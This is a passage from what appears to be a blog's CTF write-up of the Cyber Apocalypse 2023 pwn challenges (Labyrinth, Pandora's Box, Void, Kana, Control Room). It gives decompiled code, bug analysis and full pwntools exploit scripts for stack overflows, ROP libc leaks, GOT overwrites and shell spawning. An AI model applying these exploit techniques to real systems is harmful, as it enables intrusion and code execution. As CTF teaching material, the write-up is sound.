bird and be free!\\\"\\n\" \"\\n\" \"Would you like to change the door you chose?\\n\" \"\\n\" \"\u003e\u003e \", 1uLL, 0xA0uLL, _bss_start); fgets(v4, 68, stdin); } fprintf(_bss_start, \"\\n%s[-] YOU FAILED TO ESCAPE!\\n\\n\", \"\\x1B[1;31m\"); return 0; } Above is the main function. If you take a closer look, you’ll notice a buffer overflow vulnerability in the v4 variable when fgets(v4, 68, stdin); is called. Additionally, while disassembling the binary, I came across a useful function called escape_plan. escape_plan int escape_plan() { char buf; // [rsp+Bh] [rbp-5h] BYREF int fd; // [rsp+Ch] [rbp-4h] putchar(10); fwrite(\u0026unk_402018, 1uLL, 0x1F0uLL, _bss_start); fprintf( _bss_start, \"\\n%sCongratulations on escaping! Here is a sacred spell to help you continue your journey: %s\\n\", \"\\x1B[1;32m\", \"\\x1B[0m\"); fd = open(\"./flag.txt\", 0); if ( fd \u003c 0 ) { perror(\"\\nError opening flag.txt, please contact an Administrator.\\n\\n\"); exit(1); } while ( read(fd, \u0026buf, 1uLL) \u003e 0 ) fputc(buf, _bss_start); return close(fd); } The given code snippet shows that the escape_plan method will print the flag. Therefore, our objective is to manipulate the program’s execution flow in such a way that it calls the escape_plan method. ","date":"Mar 23, 2023","objectID":"/posts/cyber-apocalypse-2023-pwn/:1:1","tags":["Writeup","Cyber Apocalypse","htb","pwn","heap","tcache","UDA","Buffer Overflow","ROP"],"title":"Cyber Apocalypse 2023: Pwn","uri":"/posts/cyber-apocalypse-2023-pwn/"},{"categories":null,"content":"Solution This is a classic buffer overflow challenge. As we can see in the decompiled main function, the buffer v4 position is in rbp-30h. Therefore, we need to send a payload that contains: b'a'*0x30 (to fill the stack) p64(exe.bss()+0x200) (to overwrite the saved RBP with a valid address in the .bss section) p64(escape_plan_addr) (to overwrite the stored RIP with the escape_plan function address) Full Script Here is the script I used to solve the challenge: from pwn import * exe = ELF(\"./labyrinth_patched\") libc = ELF(\"./libc.so.6\") ld = ELF(\"./ld-2.35.so\") context.binary = exe context.arch = 'amd64' context.encoding = 'latin' context.log_level = 'INFO' warnings.simplefilter(\"ignore\") remote_url = \"167.99.86.8\" remote_port = 32088 gdbscript = ''' ''' def conn(): if args.LOCAL: r = process([exe.path]) if args.PLT_DEBUG: # gdb.attach(r, gdbscript=gdbscript) pause() else: r = remote(remote_url, remote_port) return r r = conn() # I choose to jump not to the start of escape_plan, but directly to the line that open and print the flag. win_addr = 0x00000000004012b0 r.sendline(b'69') payload = b'a'*0x30 + p64(exe.bss()+0x200)+p64(win_addr) r.sendline(payload) r.interactive() Flag: HTB{3sc4p3_fr0m_4b0v3} ","date":"Mar 23, 2023","objectID":"/posts/cyber-apocalypse-2023-pwn/:1:2","tags":["Writeup","Cyber Apocalypse","htb","pwn","heap","tcache","UDA","Buffer Overflow","ROP"],"title":"Cyber Apocalypse 2023: Pwn","uri":"/posts/cyber-apocalypse-2023-pwn/"},{"categories":null,"content":"Pandora’s Box Description You stumbled upon one of Pandora’s mythical boxes. Would you be curious enough to open it and see what’s inside, or would you opt to give it to your team for analysis? ","date":"Mar 23, 2023","objectID":"/posts/cyber-apocalypse-2023-pwn/:2:0","tags":["Writeup","Cyber Apocalypse","htb","pwn","heap","tcache","UDA","Buffer Overflow","ROP"],"title":"Cyber Apocalypse 2023: Pwn","uri":"/posts/cyber-apocalypse-2023-pwn/"},{"categories":null,"content":"Initial Analysis We were given a binary called pb. Let’s start by analyzing the binary’s security measures using the checksec tool. Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) The binary has the following security features: Full RELRO, preventing overwriting the GOT. No canary, indicating a lack of stack protection. NX enabled, preventing jumping to the stack due to its non-executable property. No PIE, which means the binary address is constant. The binary disassembly can be seen below. main int __cdecl main(int argc, const char **argv, const char **envp) { setup(argc, argv, envp); cls(); banner(); box(); return 0; } The functions setup, cls, and banner aren’t too important. Let’s focus on disassembling the box function. box size_t box() { __int64 v0; // rdx __int64 v1; // rcx char s[8]; // [rsp+0h] [rbp-30h] BYREF __int64 v4; // [rsp+8h] [rbp-28h] __int64 v5; // [rsp+10h] [rbp-20h] __int64 v6; // [rsp+18h] [rbp-18h] __int64 num; // [rsp+28h] [rbp-8h] *(_QWORD *)s = 0LL; v4 = 0LL; v5 = 0LL; v6 = 0LL; fwrite( \"This is one of Pandora's mythical boxes!\\n\" \"\\n\" \"Will you open it or Return it to the Library for analysis?\\n\" \"\\n\" \"1. Open.\\n\" \"2. Return.\\n\" \"\\n\" \"\u003e\u003e \", 1uLL, 0x7EuLL, _bss_start); num = read_num( \"This is one of Pandora's mythical boxes!\\n\" \"\\n\" \"Will you open it or Return it to the Library for analysis?\\n\" \"\\n\" \"1. Open.\\n\" \"2. Return.\\n\" \"\\n\" \"\u003e\u003e \", 1LL, v0, v1); if ( num != 2 ) { fprintf(_bss_start, \"%s\\nWHAT HAVE YOU DONE?! WE ARE DOOMED!\\n\\n\", \"\\x1B[1;31m\"); exit(1312); } fwrite(\"\\nInsert location of the library: \", 1uLL, 0x21uLL, _bss_start); fgets(s, 256, stdin); return fwrite( \"\\nWe will deliver the mythical box to the Library for analysis, thank you!\\n\\n\", 1uLL, 0x4BuLL, _bss_start); } The same buffer overflow vulnerability can be observed in this challenge as well, specifically in the line fgets(s, 256, stdin). However, unlike the previous challenge, there doesn’t seem to be any concealed function that can print the flag. ","date":"Mar 23, 2023","objectID":"/posts/cyber-apocalypse-2023-pwn/:2:1","tags":["Writeup","Cyber Apocalypse","htb","pwn","heap","tcache","UDA","Buffer Overflow","ROP"],"title":"Cyber Apocalypse 2023: Pwn","uri":"/posts/cyber-apocalypse-2023-pwn/"},{"categories":null,"content":"Solution The solution for this challenge involves ROP (Return Oriented Programming). Typically, there are two steps required to achieve code execution for this type of challenge: Leaking a libc address Forging the code execution flow to obtain a shell. Since the binary is not PIE, we do not need to leak a PIE address and can directly use the available PLT provided in the binary. Additionally, we can use some available gadgets to perform the classic ROP. Full Script Here’s my full script that uses ROP (Return Oriented Programming) to solve this challenge: from pwn import * exe = ELF(\"./pb_patched\") libc = ELF(\"./libc.so.6\") ld = ELF(\"./ld-2.35.so\") context.binary = exe context.arch = 'amd64' context.encoding = 'latin' context.log_level = 'INFO' warnings.simplefilter(\"ignore\") remote_url = \"178.62.64.13\" remote_port = 32229 gdbscript = ''' ''' def conn(): if args.LOCAL: r = process([exe.path]) if args.PLT_DEBUG: # gdb.attach(r, gdbscript=gdbscript) pause() else: r = remote(remote_url, remote_port) return r r = conn() pop_rdi = 0x000000000040142b pop_rsi_r15 = 0x0000000000401429 puts_plt = exe.plt['puts'] puts_got = exe.got['puts'] payload = b'a'*0x30 + p64(exe.bss()+0x200) payload += p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(exe.symbols['box']) r.sendline(b'2') r.sendline(payload) r.recvuntil(b'you!\\n') r.recvline() leaked_puts = u64(r.recv(6).ljust(8, b'\\x00')) libc.address = leaked_puts - libc.symbols['puts'] log.info(f'libc base: {hex(libc.address)}') bin_sh_string_addr = next(libc.search(b'/bin/sh')) payload = b'a'*0x30 + p64(exe.bss()+0x200) payload += p64(pop_rdi+0x1) + p64(pop_rdi) + p64(bin_sh_string_addr) + p64(libc.symbols['system']) r.sendline(b'2') r.sendline(payload) r.interactive() Flag: HTB{r3turn_2_P4nd0r4?!} ","date":"Mar 23, 2023","objectID":"/posts/cyber-apocalypse-2023-pwn/:2:2","tags":["Writeup","Cyber Apocalypse","htb","pwn","heap","tcache","UDA","Buffer Overflow","ROP"],"title":"Cyber Apocalypse 2023: Pwn","uri":"/posts/cyber-apocalypse-2023-pwn/"},{"categories":null,"content":"Void Description The room goes dark and all you can see is a damaged terminal. Hack into it to restore the power and find your way out. ","date":"Mar 23, 2023","objectID":"/posts/cyber-apocalypse-2023-pwn/:3:0","tags":["Writeup","Cyber Apocalypse","htb","pwn","heap","tcache","UDA","Buffer Overflow","ROP"],"title":"Cyber Apocalypse 2023: Pwn","uri":"/posts/cyber-apocalypse-2023-pwn/"},{"categories":null,"content":"Initial Analysis We were given a binary file. Let’s try to checksec it first RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) The binary has the following security features: Partial RELRO, indicating that we can overwrite the GOT. No canary, indicating a lack of stack protection. NX enabled, preventing jumping to the stack due to its non-executable property. No PIE, which means the binary address is constant. Let’s try to disassemble it. main int __cdecl main(int argc, const char **argv, const char **envp) { vuln(argc, argv, envp); return 0; } The main called the vuln. Let’s check the vuln method. vuln ssize_t vuln() { char buf[64]; // [rsp+0h] [rbp-40h] BYREF return read(0, buf, 0xC8uLL); } As you have noticed, there is another buffer overflow vulnerability in the vuln function. However, the binary seems to be very small. Let’s take a look at the available Global Offset Table (GOT) using gdb. pwndbg\u003e got GOT protection: Partial RELRO | GOT functions: 1 [0x404018] read@GLIBC_2.2.5 -\u003e 0x7ffff7ee1780 (read) ◂— mov eax, dword ptr fs:[0x18] Okay, so the GOT only contains read function. Therefore, there isn’t any method like puts that we can use to leak a libc address to gain a shell. Given the limitations of this small binary, it is clear that we need to find another way to get a shell. ","date":"Mar 23, 2023","objectID":"/posts/cyber-apocalypse-2023-pwn/:3:1","tags":["Writeup","Cyber Apocalypse","htb","pwn","heap","tcache","UDA","Buffer Overflow","ROP"],"title":"Cyber Apocalypse 2023: Pwn","uri":"/posts/cyber-apocalypse-2023-pwn/"},{"categories":null,"content":"Solution With the aid of ropr, let’s identify the available gadgets in the binary. ropr void -m 10 ... 0x00401108: add [rbp-0x3d], ebx; nop [rax+rax]; ret; ... 0x004011b2: pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret; ... Notice that the first gadget is called add-what-where, which is a useful gadget. If we’re able to set the contents of rbp-0x3d and ebx, we can write to any memory location by incrementing the value with ebx. With the second gadget, we can set the rbp and rbx values. BSince the binary is No PIE, we can rewrite the read GOT entry with any libc function address that we want without needing a leak. We just need to calculate the difference between our target libc function address and the read address. What should we overwrite the read GOT with? The answer is we can rewrite it with the address of one_gadget. Let’s check the one_gadget result on the given libc. one_gadget libc.so.6 0xc961a execve(\"/bin/sh\", r12, r13) constraints: [r12] == NULL || r12 == NULL [r13] == NULL || r13 == NULL 0xc961d execve(\"/bin/sh\", r12, rdx) constraints: [r12] == NULL || r12 == NULL [rdx] == NULL || rdx == NULL 0xc9620 execve(\"/bin/sh\", rsi, rdx) constraints: [rsi] == NULL || rsi == NULL [rdx] == NULL || rdx == NULL Notice that the first one_gadget can be used because we have the gadget to set the r12 and r13 values as well. To summarize the steps needed to exploit this binary: Exploit the buffer overflow vulnerability to redirect the execution flow and overwrite the read GOT entry with the address of one_gadget Call read again, which will trigger the one_gadget and spawn a shell. Full Script Here’s my full script to solve this challenge: from pwn import * exe = ELF(\"./void_patched\") libc = ELF(\"./libc.so.6\") ld = ELF(\"./ld-linux-x86-64.so.2\") context.binary = exe context.arch = 'amd64' context.encoding = 'latin' context.log_level = 'INFO' warnings.simplefilter(\"ignore\") remote_url = \"209.97.134.50\" remote_port = 30893 gdbscript = ''' ''' def conn(): if args.LOCAL: r = process([exe.path]) if args.PLT_DEBUG: # gdb.attach(r, gdbscript=gdbscript) pause() else: r = remote(remote_url, remote_port) return r r = conn() pop_rdi = 0x00000000004011bb pop_rsi_r15 = 0x00000000004011b9 add_what_where = 0x0000000000401108 pop_rbx_rbp_r12_r13_r14_r15 = 0x004011b2 ret_address = pop_rdi+1 read_plt = exe.plt['read'] read_got = exe.got['read'] # Load stage 2 rop payload = b'a'*0x48 payload += p64(pop_rbx_rbp_r12_r13_r14_r15) + p64(0xfffdce9a) + p64(read_got+0x3d) + p64(0)*4 payload += p64(add_what_where) payload += p64(read_plt) r.sendline(payload) r.interactive() Flag: HTB{r3s0lv3_th3_d4rkn355} ","date":"Mar 23, 2023","objectID":"/posts/cyber-apocalypse-2023-pwn/:3:2","tags":["Writeup","Cyber Apocalypse","htb","pwn","heap","tcache","UDA","Buffer Overflow","ROP"],"title":"Cyber Apocalypse 2023: Pwn","uri":"/posts/cyber-apocalypse-2023-pwn/"},{"categories":null,"content":"Kana Description To facilitate communication between certain civilizations, a converter was developed. But can this converter be trusted to keep their messages secure? ","date":"Mar 23, 2023","objectID":"/posts/cyber-apocalypse-2023-pwn/:4:0","tags":["Writeup","Cyber Apocalypse","htb","pwn","heap","tcache","UDA","Buffer Overflow","ROP"],"title":"Cyber Apocalypse 2023: Pwn","uri":"/posts/cyber-apocalypse-2023-pwn/"},{"categories":null,"content":"Initial Analysis In this challenge, we are given a binary file. Let’s use the checksec tool to check its security features. RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled All protections are on except there isn’t canary set in the stack. Let’s try to disassemble the binary one by one. main void __fastcall __noreturn main(int a1, char **a2, char **a3) { int v3; // ebx char v4[80]; // [rsp+10h] [rbp-B0h] BYREF char v5[96]; // [rsp+60h] [rbp-60h] BYREF sub_270A(v4, a2, a3); sub_75DD(); while ( 1 ) { sub_6E56(v5, v4); v3 = sub_7642(v5); sub_6DFC(v5); switch ( v3 ) { case 1: sub_39FC(v4); break; case 2: sub_3DF8(v4); break; case 3: sub_41EE(v4); break; case 4: sub_46FA(v4); break; case 5: exit(0); default: continue; } } } Since this binary has been stripped, it’s difficult to see what’s going on just by disassembling it. Let’s run it to get a better idea. ------------------------------------------ [文] : 1 - kata-fy 2 - hira-fy 3 - alpha-fy 4 - new kana 5 - exit \u003e\u003e 4 \u003e\u003e aaaa ------------------------------------------ [文] : aaaa 1 - kata-fy 2 - hira-fy 3 - alpha-fy 4 - new kana 5 - exit \u003e\u003e It turns out that this binary has five menus, and the fourth menu can be used to generate a new kana that is printed each time the binary displays a menu. I spent a lot of time on this challenge trying to find the bug, but it turns out that the first, second, and third menus are actually just a distraction. The bug is in the sub_7642 (print menu) function itself, particularly when reading the user’s chosen option. Below is the disassembly of the sub_7642 function. sub_7642 int __fastcall sub_7642(__int64 a1) { __int64 v1; // rax __int64 v2; // rbx __int64 v3; // rax __int64 v4; // rax __int64 v5; // rax __int64 v6; // rax __int64 v7; // rax __int64 v8; // rax __int64 s[6]; // [rsp+10h] [rbp-70h] BYREF char v11[44]; // [rsp+40h] [rbp-40h] BYREF int v12; // [rsp+6Ch] [rbp-14h] memset(s, 0, sizeof(s)); v12 = 0; v1 = std::operator\u003c\u003c\u003cstd::char_traits\u003cchar\u003e\u003e(\u0026std::cout, \"------------------------------------------\"); std::ostream::operator\u003c\u003c(v1, \u0026std::endl\u003cchar,std::char_traits\u003cchar\u003e\u003e); v2 = std::operator\u003c\u003c\u003cstd::char_traits\u003cchar\u003e\u003e(\u0026std::cout, \u0026unk_819B); sub_476E(v11, a1); v3 = std::operator\u003c\u003c\u003cchar\u003e(v2, v11); std::ostream::operator\u003c\u003c(v3, \u0026std::endl\u003cchar,std::char_traits\u003cchar\u003e\u003e); std::string::~string(v11); v4 = std::operator\u003c\u003c\u003cstd::char_traits\u003cchar\u003e\u003e(\u0026std::cout, \" 1 - kata-fy\"); std::ostream::operator\u003c\u003c(v4, \u0026std::endl\u003cchar,std::char_traits\u003cchar\u003e\u003e); v5 = std::operator\u003c\u003c\u003cstd::char_traits\u003cchar\u003e\u003e(\u0026std::cout, \" 2 - hira-fy\"); std::ostream::operator\u003c\u003c(v5, \u0026std::endl\u003cchar,std::char_traits\u003cchar\u003e\u003e); v6 = std::operator\u003c\u003c\u003cstd::char_traits\u003cchar\u003e\u003e(\u0026std::cout, \" 3 - alpha-fy\"); std::ostream::operator\u003c\u003c(v6, \u0026std::endl\u003cchar,std::char_traits\u003cchar\u003e\u003e); v7 = std::operator\u003c\u003c\u003cstd::char_traits\u003cchar\u003e\u003e(\u0026std::cout, \" 4 - new kana\"); std::ostream::operator\u003c\u003c(v7, \u0026std::endl\u003cchar,std::char_traits\u003cchar\u003e\u003e); v8 = std::operator\u003c\u003c\u003cstd::char_traits\u003cchar\u003e\u003e(\u0026std::cout, \" 5 - exit\"); std::ostream::operator\u003c\u003c(v8, \u0026std::endl\u003cchar,std::char_traits\u003cchar\u003e\u003e); std::operator\u003c\u003c\u003cstd::char_traits\u003cchar\u003e\u003e(\u0026std::cout, \"\u003e\u003e \"); memset(s, 0, sizeof(s)); while ( 1 ) { read(0, (char *)s + v12, 1uLL); if ( *((_BYTE *)s + v12) == 10 ) break; ++v12; } *((_BYTE *)s + v12) = 0; return atoi((const char *)s); } s is the array that will be used to store our chosen option. However, notice that the size of s is only 6, yet the reading logic is as follows: __int64 s[6]; // [rsp+10h] [rbp-70h] BYREF char v11[44]; // [rsp+40h] [rbp-40h] BYREF int v12; // [rsp+6Ch] [rbp-14h] ... memset(s, 0, sizeof(s)); while ( 1 ) { read(0, (char *)s + v12, 1uLL); if ( *((_BYTE *)s + v12) == 10 ) break; ++v12; } *((_BYTE *)s + v12) = 0; return atoi((const char *)s); The read function is reading our input one character at a time, and it will stop only if the input character is \\n. Each time it reads a byte, it will increment the v12 counter, which is stored in the stack. However, the size of s is only 6, which means ","date":"Mar 23, 2023","objectID":"/posts/cyber-apocalypse-2023-pwn/:4:1","tags":["Writeup","Cyber Apocalypse","htb","pwn","heap","tcache","UDA","Buffer Overflow","ROP"],"title":"Cyber Apocalypse 2023: Pwn","uri":"/posts/cyber-apocalypse-2023-pwn/"},{"categories":null,"content":"Solution The issue with the binary is that it’s PIE-enabled, which means that without a leak of either the PIE base or libc, it’s not possible to use the buffer overflow bug to gain a shell. Normally, we’d need to overwrite the saved RIP, but we don’t know what address to write to because we don’t know the base address. However, the setup of this challenge is unique. The v12 variable, which is the counter used as the offset of the current read, is located below the s position in the stack. This means that the buffer overflow can also overwrite v12 with a large value, allowing us to skip some bytes and jump directly to the desired location. Using this bug, we can perform the buffer overflow without overwriting the saved RIP in the stack. The question now is whether there’s a good target in the stack that resides below the saved RIP. Fortunately, there is a suitable target in the stack below the saved RIP that we can use to leak a value. While debugging with gdb, I noticed that using the fourth menu to generate a new kana (a string that is always printed when the menu is printed) performs the following steps: Allocating the string to a heap chunk Put the heap chunk address at the stack pwndbg\u003e tele 30 00:0000│ rsp 0x7fffffffdad0 ◂— 0x21 /* '!' */ 01:0008│ 0x7fffffffdad8 —▸ 0x7fffffffdbc0 —▸ 0x7ffff7d44ce0 (main_arena+96) —▸ 0x5555555785b0 ◂— 0x0 02:0010│ rcx-2 0x7fffffffdae0 ◂— 0x3031 /* '10' */ 03:0018│ 0x7fffffffdae8 ◂— 0x0 04:0020│ 0x7fffffffdaf0 ◂— 0x0 05:0028│ 0x7fffffffdaf8 ◂— 0x0 06:0030│ 0x7fffffffdb00 ◂— 0x0 07:0038│ 0x7fffffffdb08 ◂— 0x0 08:0040│ 0x7fffffffdb10 —▸ 0x555555578590 ◂— 0x555555578 09:0048│ 0x7fffffffdb18 ◂— 0x20 /* ' ' */ 0a:0050│ 0x7fffffffdb20 ◂— 0x20 /* ' ' */ 0b:0058│ 0x7fffffffdb28 —▸ 0x55555555ae99 ◂— jmp 0x55555555aeb9 0c:0060│ 0x7fffffffdb30 —▸ 0x7fffffffdb70 ◂— 0x0 0d:0068│ 0x7fffffffdb38 ◂— 0x2ffffdbc0 0e:0070│ 0x7fffffffdb40 —▸ 0x55555555fc20 —▸ 0x5555555566c0 ◂— endbr64 0f:0078│ 0x7fffffffdb48 ◂— 0x4 10:0080│ rbp 0x7fffffffdb50 —▸ 0x7fffffffdc20 ◂— 0x1 11:0088│ 0x7fffffffdb58 —▸ 0x55555555ac74 ◂— mov ebx, eax 12:0090│ ... 19:00c8│ 0x7fffffffdb98 ◂— 0x57 /* 'W' */ 1a:00d0│ 0x7fffffffdba0 —▸ 0x555555576d50 ◂— 'bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb' 1b:00d8│ 0x7fffffffdba8 ◂— 0x20 /* ' ' */ At this point, I realized that we could leverage this behavior to obtain a leak by overwriting the stack location containing our kana address with the address of our target. Using the buffer overflow bug, we could first attempt to leak the heap address. Leaking heap address With the buffer overflow bug, we can overwrite the last byte of the kana address to null. As we can see from the examination via GDB below, if we overwrite the last byte of kana with null, we will be able to get a leak of the heap address. pwndbg\u003e x/10gx 0x555555576d00 0x555555576d00: 0x0000555000000001 0x0000555555576bc0 0x555555576d10: 0x0000555555577a20 0x0000555555576c10 0x555555576d20: 0x0000000000e38391 0x0000555555576d38 0x555555576d30: 0x0000000000000002 0x0000000000006170 0x555555576d40: 0x0000000000000000 0x0000000000000051 Below is a script snippet that demonstrates how to obtain a leak of the heap address using the buffer overflow vulnerability: from pwn import * exe = ELF(\"./kana_patched\") libc = ELF(\"./libc-2.35.so\") ld = ELF(\"./ld-2.35.so\") context.binary = exe context.arch = 'amd64' context.encoding = 'latin' context.log_level = 'INFO' warnings.simplefilter(\"ignore\") remote_url = \"144.126.196.198\" remote_port = 31803 gdbscript = ''' ''' def conn(): if args.LOCAL: r = process([exe.path]) if args.PLT_DEBUG: # gdb.attach(r, gdbscript=gdbscript) pause() else: r = remote(remote_url, remote_port) return r r = conn() r.sendlineafter(b'\u003e\u003e ', b'4') r.sendlineafter(b'\u003e\u003e ', b'b'*0x20) # Leak heap # The a*'0x5c' and '\\xaf' is a crafted payload that we can use # to skip the option read by 0xaf bytes, so that we can leap over # the saved RIP during triggering the buffer overflow bug. # # Basically, withh the BOF, we overwrite the v12 value to 0","date":"Mar 23, 2023","objectID":"/posts/cyber-apocalypse-2023-pwn/:4:2","tags":["Writeup","Cyber Apocalypse","htb","pwn","heap","tcache","UDA","Buffer Overflow","ROP"],"title":"Cyber Apocalypse 2023: Pwn","uri":"/posts/cyber-apocalypse-2023-pwn/"},{"categories":null,"content":"Control Room Description After unearthing the crashed alien spacecraft you have hacked your way into it’s interior. Nothing seems perticularily interesting until you find the spacecraft’s control room. Filled with monitors, buttons and panels this room surely contains a lot of important information, including the coordinates of the underground alien vessels that you ’ve been looking for. You decide to start off by booting up the main computer. You hear an uncanny buzzing-like noise and then a monitor lights up requesting you to enter a username. Can you take control of the Control Room? ","date":"Mar 23, 2023","objectID":"/posts/cyber-apocalypse-2023-pwn/:5:0","tags":["Writeup","Cyber Apocalypse","htb","pwn","heap","tcache","UDA","Buffer Overflow","ROP"],"title":"Cyber Apocalypse 2023: Pwn","uri":"/posts/cyber-apocalypse-2023-pwn/"},{"categories":null,"content":"Initial Analysis We were given a binary file. Let’s try to checksec it first Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) The binary has the following security features: Partial RELRO, indicating that we can overwrite the GOT. Canary found, indicating a canary is exist to protect the stack. NX enabled, preventing jumping to the stack due to its non-executable property. No PIE, which means the binary address is constant. Let’s disassemble the binary and see what we can find. main int __cdecl main(int argc, const char **argv, const char **envp) { char s[4]; // [rsp+14h] [rbp-Ch] BYREF unsigned __int64 v5; // [rsp+18h] [rbp-8h] v5 = __readfsqword(0x28u); setup(argc, argv, envp); *(_DWORD *)s = 0; user_register(); printf(\"\\nAre you sure about your username choice? (y/n)\"); printf(\"\\n\u003e \"); fgets(s, 4, stdin); s[strcspn(s, \"\\n\")] = 0; if ( !strcmp(s, \"y\") ) log_message(0LL, \"User registered successfully.\\n\"); else user_edit(); menu(); return 0; } Upon examining the main method, we can observe that before calling the menu function, the program prompts the user to perform the following actions: Register our username Choose whether to edit the username or not before proceeding to the menu function. Next, let’s take a closer look at the setup function. setup char *setup() { char *result; // rax setvbuf(stdin, 0LL, 2, 0LL); setvbuf(stdout, 0LL, 2, 0LL); read_banner(); memset(\u0026engines, 0, 0x80uLL); curr_user = (char *)malloc(0x110uLL); result = curr_user; *((_DWORD *)curr_user + 0x40) = 2; return result; } We can see that there is a global variable named curr_user which is a pointer to a chunk with size 0x110. In addition, the function sets the value at curr_user+0x100 to 2. Now, let’s move on to the user_register function. user_register unsigned __int64 user_register() { char src[8]; // [rsp+0h] [rbp-110h] BYREF __int64 v2; // [rsp+8h] [rbp-108h] __int64 v3; // [rsp+10h] [rbp-100h] __int64 v4; // [rsp+18h] [rbp-F8h] __int64 v5; // [rsp+20h] [rbp-F0h] __int64 v6; // [rsp+28h] [rbp-E8h] __int64 v7; // [rsp+30h] [rbp-E0h] __int64 v8; // [rsp+38h] [rbp-D8h] __int64 v9; // [rsp+40h] [rbp-D0h] __int64 v10; // [rsp+48h] [rbp-C8h] __int64 v11; // [rsp+50h] [rbp-C0h] __int64 v12; // [rsp+58h] [rbp-B8h] __int64 v13; // [rsp+60h] [rbp-B0h] __int64 v14; // [rsp+68h] [rbp-A8h] __int64 v15; // [rsp+70h] [rbp-A0h] __int64 v16; // [rsp+78h] [rbp-98h] __int64 v17; // [rsp+80h] [rbp-90h] __int64 v18; // [rsp+88h] [rbp-88h] __int64 v19; // [rsp+90h] [rbp-80h] __int64 v20; // [rsp+98h] [rbp-78h] __int64 v21; // [rsp+A0h] [rbp-70h] __int64 v22; // [rsp+A8h] [rbp-68h] __int64 v23; // [rsp+B0h] [rbp-60h] __int64 v24; // [rsp+B8h] [rbp-58h] __int64 v25; // [rsp+C0h] [rbp-50h] __int64 v26; // [rsp+C8h] [rbp-48h] __int64 v27; // [rsp+D0h] [rbp-40h] __int64 v28; // [rsp+D8h] [rbp-38h] __int64 v29; // [rsp+E0h] [rbp-30h] __int64 v30; // [rsp+E8h] [rbp-28h] __int64 v31; // [rsp+F0h] [rbp-20h] __int64 v32; // [rsp+F8h] [rbp-18h] unsigned __int64 v33; // [rsp+108h] [rbp-8h] v33 = __readfsqword(0x28u); puts(\"\u003c===[ Register ]===\u003e\\n\"); *(_QWORD *)src = 0LL; v2 = 0LL; v3 = 0LL; v4 = 0LL; v5 = 0LL; v6 = 0LL; v7 = 0LL; v8 = 0LL; v9 = 0LL; v10 = 0LL; v11 = 0LL; v12 = 0LL; v13 = 0LL; v14 = 0LL; v15 = 0LL; v16 = 0LL; v17 = 0LL; v18 = 0LL; v19 = 0LL; v20 = 0LL; v21 = 0LL; v22 = 0LL; v23 = 0LL; v24 = 0LL; v25 = 0LL; v26 = 0LL; v27 = 0LL; v28 = 0LL; v29 = 0LL; v30 = 0LL; v31 = 0LL; v32 = 0LL; printf(\"Enter a username: \"); read_input(src, 256LL); strncpy(curr_user, src, 0x100uLL); *((_QWORD *)curr_user + 33) = strlen(curr_user) + 1; return __readfsqword(0x28u) ^ v33; } Reading through the code, it just reads the username input, stores it in curr_user, and then stores the length as well in the curr_user struct. Let’s move to the user_edit function. void user_edit() { int n; // [rsp+4h] [rbp-Ch] void *s; // [rsp+8h] [rbp-8h] puts(\"\u003c===[ Edit Username ]===\u003e\\n\"); printf(\"New username size: \"); n = read_num(); getchar(); if ( *((_","date":"Mar 23, 2023","objectID":"/posts/cyber-apocalypse-2023-pwn/:5:1","tags":["Writeup","Cyber Apocalypse","htb","pwn","heap","tcache","UDA","Buffer Overflow","ROP"],"title":"Cyber Apocalypse 2023: Pwn","uri":"/posts/cyber-apocalypse-2023-pwn/"},{"categories":null,"content":"Solution Leaking libc address To gain a shell, we need to get a leak of the libc address. Based on the above bugs, the only possible path to get a libc leak is by trigering the UDA bug, with hope that the UDA is a libc address. After trying this method, turn out we’re lucky enough because the UDA value is indeed a libc address. Below is the proof [*] Current Role: Captain Option [1-5]: 4 selection: 4 \u003c===[ Route ]===\u003e \u003c===[ Coordinates [1] ]===\u003e Latitude : 140542399197248 Longitude : 140542396966484 \u003c===[ Coordinates [2] ]===\u003e Latitude : 0 Longitude : 4199857 \u003c===[ Coordinates [3] ]===\u003e Latitude : 11214159609856 Longitude : 3333855601743636224 \u003c===[ Coordinates [4] ]===\u003e Latitude : 140726594745344 Longitude : 4199934 As you can see, the first coordinate longitude is indeed a libc address if you convert it to hex. Gain Remote Code Execution Now that we have the libc leak, we can switch our role to technician, and then trigger a OOB write with negative index. Our target is to overwrite the atoi GOT to system. After that, we can simply input sh during the read_option call in menu, and because the read option is using atoi, it will trigger system(\"sh\"), which will give us a shell. Full Script Below is my full script: from pwn import * exe = ELF(\"control_room_patched\") libc = ELF(\"./libc.so.6\") ld = ELF(\"./ld-2.35.so\") context.binary = exe context.arch = 'amd64' context.encoding = 'latin' context.log_level = 'INFO' warnings.simplefilter(\"ignore\") remote_url = \"206.189.112.129\" remote_port = 31054 gdbscript = ''' ''' def conn(): if args.LOCAL: r = process([exe.path]) if args.PLT_DEBUG: # gdb.attach(r, gdbscript=gdbscript) pause() else: r = remote(remote_url, remote_port) return r r = conn() def configure_engine(idx, v1=0, v2=0, is_printf=False): r.sendline(b'1') # configure Engine r.sendline(str(idx).encode()) if not is_printf: r.sendline(str(v1).encode()) r.sendline(str(v2).encode()) else: r.sendline() # r.interactive() r.recvuntil(f'[{idx}]:'.encode()) r.recvuntil(b': ') thrust = int(r.recvuntil(b'\\t').strip()) r.recvuntil(b': ') mixture = int(r.recvline().strip()) r.sendline(b'n') return thrust, mixture r.sendline(b'y') # Trigger the off-by-one bug r.send(b'a'*0x100) r.sendline(b'n') r.send(b'256') r.send(b'a'*0x100) # Leak stack UDA, which contains libc address r.sendline(b'3') r.sendline(b'ay') r.sendline(b'4') r.recvuntil(b'Latitude : ') r.recvuntil(b'Latitude : ') r.recvuntil(b'Latitude : ') r.recvuntil(b'Latitude : ') r.recvuntil(b'Latitude : ') r.recvuntil(b'Longitude : ') leaked_libc = int(r.recvline().strip()) libc.address = leaked_libc - (libc.symbols.atoi+20) log.info(f'libc base = {hex(libc.address)}') # Change role to technician r.sendline(b'5') r.sendline(b'1') engines_addr = 0x405120 # Change atoi to system configure_engine((exe.got['atoi']-engines_addr) // 0x10, libc.symbols.system, 0x401150) r.sendline(b'sh') # Trigger a shell r.interactive() Flag: HTB{pr3p4r3_4_1mp4ct~~!} ","date":"Mar 23, 